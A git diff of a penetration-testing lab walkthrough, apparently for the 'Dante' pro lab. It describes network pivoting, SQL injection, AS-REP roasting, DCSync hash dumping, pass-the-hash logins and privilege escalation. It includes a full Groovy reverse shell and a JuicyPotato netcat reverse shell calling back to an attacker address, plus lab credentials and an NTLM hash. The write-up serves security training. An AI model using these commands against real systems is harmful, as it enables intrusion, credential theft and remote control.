@@ -234,7 +234,7 @@ scan the ports
 proxychains nmap 172.16.1.12 -sT -sV -Pn -T5
 ```
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
 
 Found /blog
 
@@ -244,7 +244,7 @@ SQL injection [https://www.exploit-db.com/exploits/48615](https://www.exploit-db
 sqlmap -u "http://172.16.1.12/blog/category.php?id=1*" --batch -D flag --dump
 ```
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 with
 
@@ -265,7 +265,7 @@ we can access ftp with the ben credential and also ssh
 
 By doing `sudo -l` we can see that we can run /bin/bash as all users except root
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 but the version is vulnerable to this exploit  [https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502)
 
@@ -283,7 +283,7 @@ scan the ports
 proxychains nmap 172.16.1.102 -sT -sV -Pn -T5
 ```
 
-<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 On the website we can found OMRS that is vulnerable [https://www.exploit-db.com/exploits/49557](https://www.exploit-db.com/exploits/49557)
 
@@ -291,7 +291,7 @@ On the website we can found OMRS that is vulnerable [https://www.exploit-db.com/
 python3 omrs.py -u http://172.16.1.102:80/ -c 'whoami'
 ```
 
-<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 Open a reverse shell and take the flag
 
@@ -305,11 +305,11 @@ scan the ports
 proxychains nmap 172.16.1.20 -sT -sV -Pn -T5
 ```
 
-<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 Vulnerable to eternalblue
 
-<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 I also found a file with this credentials
 
@@ -323,7 +323,7 @@ scan the ports
 proxychains nmap 172.16.1.101 -sT -sV -Pn -T5
 ```
 
-<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 Try to bruteforce ftp
 
@@ -335,7 +335,7 @@ This identified valid credentials. We can login to FTP using dharding : Westmins
 
 We found a file inside called "Remote login.txt"
 
-<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 So we need to try different password for smb and try to see
 
@@ -343,7 +343,7 @@ So we need to try different password for smb and try to see
 crackmapexec winrm 172.16.1.101 -u 'dharding' -p words.txt
 ```
 
-<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 Once logging on we found out that there is IObit vulnerable (9.5) [https://www.exploit-db.com/exploits/48543](https://www.exploit-db.com/exploits/48543)
 
@@ -351,11 +351,11 @@ Once logging on we found out that there is IObit vulnerable (9.5) [https://www.e
 sc.exe qc IObitUnSvr
 ```
 
-<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 With winpeas we can also see something interesting
 
-<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
 
 So exploit it
 
@@ -370,19 +370,7 @@ sc.exe stop IObitUnSvr
 sc.exe start IObitUnSvr
 ```
 
-## 172.16.1.5
-
-scan the ports
-
-```
-proxychains nmap 172.16.1.5 -sT -sV -Pn -T5
-```
-
-<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
-
-Flag inside ftp with anonymous login
-
-## 172.16.2.5
+## DANTE-DC02
 
 Apparently there is another subnet, without any sense
 
@@ -394,5 +382,177 @@ run autoroute -s 172.16.2.0/24
 
 and run nmap against the new host with `scanner/portscan/tcp`
 
-<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
 
+Try to enumerate users with krebrute using the previous wordlist
+
+```
+/kerbrute userenum -d dante --dc 172.16.2.5 user.txt
+```
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+Asperoast the user to get the ticket and crack it offline
+
+{% code overflow="wrap" %}
+```
+impacket-GetNPUsers 'dante/jbercov' -no-pass -format hashcat -outputfile hash -dc-ip 172.16.2.5
+```
+{% endcode %}
+
+The password is `myspace7`
+
+From bloodhound we can see that jbercov has the ability to DCSync the domain, so we can dump all the hashes
+
+```
+impacket-secretsdump 'dante/jbercov':myspace7@172.16.2.5
+```
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+now we can login to the dc as administrator
+
+```
+evil-winrm -u 'Administrator' -H '4c827b7074e99eefd49d05872185f7f8' -i 172.16.2.5
+```
+
+in documents we find jenkins.bat that give us some credentials
+
+Admin\_129834765:SamsungOctober102030
+
+## DANTE-NIX7
+
+Let's enumerate some ports
+
+```
+proxychains nmap -Pn -sT -sV -T5 172.16.1.19
+```
+
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+On the :8080 using the creds found previously we can log in on jenkins ad admin
+
+<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+on /script we can launch the following groovy reverse shell to get a foothold
+
+{% code overflow="wrap" %}
+```
+String host="172.16.1.100";
+int port=4455;
+String cmd="/bin/bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+Using pspy we can found a pair of credentials for ian that we can use to su (VPN123ZXC)
+
+<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+ian is part of `disk` group that can be exploited to read all files on the system
+
+```
+debugfs /dev/sda5
+cat root/flag.txt
+```
+
+<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+## DANTE-ADMIN-NIX5
+
+The host is only reachable through dc02
+
+Let's enumerate ports
+
+```
+nmap -Pn -sT -sV -T5 172.16.2.101
+```
+
+<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+Let's try to bruteforce SSH
+
+```
+hydra -L user.txt -P pass.txt 172.16.2.101 ssh -t 4
+```
+
+the credentials are those from nix4 (julian:manchesterunited)
+
+Use [https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation) polkit exploit privesc to obtain root
+
+## ADMIN-NIX-6
+
+Another machine found reachable only from ADMIN-NIX-5
+
+```
+nmap -Pn -sT -sV -T5 172.16.2.6 
+```
+
+Only ssh open with the same credentials of julian
+
+We found in the desktop a text file regarding Sophie password change in `TerrorInflictPurpleDirt996655`.
+
+<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+Let's switch to the user plongbottom with the password found on DC01
+
+he has sudo as root on everithing so just execute bash as root to pwn the system
+
+```
+sudo bash
+```
+
+## DANTE-SQL01
+
+scan the ports
+
+```
+proxychains nmap 172.16.1.5 -sT -sV -Pn -T5
+```
+
+<figure><img src="../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
+
+Flag inside ftp with anonymous login
+
+You can access to sql using the credentials found on ADMIN-NIX6
+
+```
+impacket-mssqlclient dante/sophie@172.16.1.5
+```
+
+we have admin rights and can launch system commands
+
+```
+exec master..xp_cmdshell 'whoami'
+```
+
+<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+In C:\DB\_backups we found a file named db\_backups.ps1 with inside the sophie password
+
+<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+sophie:Alltheleavesarebrown1
+
+login with evil-winrm
+
+```
+evil-winrm -u 'sophie' -p 'Alltheleavesarebrown1' -i 172.16.1.5 -s Tools/CRTE/
+```
+
+sophie has vulnerable privileges
+
+<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+
+use juicypotato
+
+{% code overflow="wrap" %}
+```
+./juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "cmd.exe /c c:\users\sophie\nc64.exe -e cmd.exe 172.16.1.100 9999" -t * -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
